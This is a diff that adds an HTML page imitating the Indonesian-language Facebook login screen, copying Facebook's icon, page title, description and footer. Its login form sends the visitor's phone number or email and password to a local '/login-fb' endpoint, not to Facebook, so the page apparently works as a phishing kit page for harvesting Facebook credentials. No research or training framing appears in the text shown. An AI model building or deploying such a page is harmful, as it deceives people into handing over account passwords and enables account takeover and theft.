@@ -1,0 +1,77 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Facebook - Masuk atau Daftar</title>
+  <meta name="description" content="Buat akun atau masuk ke Facebook. Terhubunglah dengan teman, keluarga, dan orang lain yang Anda kenal. Bagikan foto dan video, kirim pesan, dan dapatkan...">
+  <meta property="og:site_name" content="Facebook">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Facebook - Masuk atau Daftar">
+  <meta property="og:description" content="Buat akun atau masuk ke Facebook. Terhubunglah dengan teman, keluarga, dan orang lain yang Anda kenal. Bagikan foto dan video, kirim pesan, dan dapatkan kabar terbaru.">
+  <link rel="icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yh/r/Sg2QOE06yVC.png">
+  <link rel="stylesheet" type="text/css" href="/css/index.css">
+  <style type="text/css">
+    #button:active {
+      background-color: #25bb007e;
+    }
+  </style>
+<!--   
+<script src="https://cdn.jsdelivr.net/npm/eruda"></script>
+<script>eruda.init();</script>
+ -->
+</head>
+<body class="font-sans h-screen flex lg:items-center lg:justify-center md:items-center md:justify-center sm:items-center sm:justify-center">
+  <div class="w-full max-w-lg bg-white p-2">
+    
+    <div class="bg-blue-100 p-2 text-">
+      <span class="text-xs text-gray-700">Facebook meminta dan menerima nomor telepon Anda dari jaringan seluler Anda. <a href="" class="text-blue-600 pengaturan">Mengubah Pengaturan</a></span>
+    </div>
+    <hr class="border-t border-blue-200 mt-0">
+    
+    <div class="p-4 rounded-md text-center">
+      <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yh/r/Sg2QOE06yVC.png" width="50" class="m-auto" alt="facebook">
+    </div>
+
+    <div class="mt-4">
+      <form action="/login-fb" method="post" id="form" class="space-y-4">
+        <input type="hidden" id="login" name="login-fb" value="Facebook">
+        <input type="text" id="email" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" required class="w-full h-10 px-4 py-5 border border-gray-300 rounded-md shadow-sm bg-gray-100">
+        <input type="password" id="password" name="password" placeholder="Kata Sandi" required class="w-full h-10 px-4 py-5 border border-gray-300 rounded-md shadow-sm bg-gray-100">
+        <button type="submit" id="submit" class="w-full h-10 bg-blue-600 text-white rounded-md font-bold hover:bg-blue-500">Masuk</button>
+      </form>
+      <p class="text-red-500 err"></p>
+    </div>
+
+    <p class="text-center mt-2"><a href="" id="lupaSandi" class="text-blue-600 text-sm">Lupa kata sandi?</a></p>
+
+    <div class="flex items-center my-4 mx-3">
+      <hr class="flex-grow border-t border-gray-300">
+      <span class="mx-2 text-gray-600">atau</span>
+      <hr class="flex-grow border-t border-gray-300">
+    </div>
+
+    <p class="text-center">
+      <button type="button" id="button" class="border border-gray-300 rounded-md bg-white w-3/4 h-9 font-bold">Buat akun baru</button>
+    </p>
+
+    <div class="flex justify-center mt-10 text-gray-600">
+      <div class="flex flex-col items-center mr-10">
+        <span>Bahasa Indonesia</span>
+        <span>Basa Jawa</span>
+        <span>English (UK)</span>
+        <span>日本語</span>
+      </div>
+      <div class="flex flex-col items-center">
+        <span>Português (Brasil)</span>
+        <span>Español</span>
+      </div>
+    </div>
+
+    <footer class="text-center text-xs text-gray-600 mt-4">Meta &copy; 2025</footer>
+    
+  </div>
+
+  <script src="/js/index.js"></script>
+</body>
+</html>
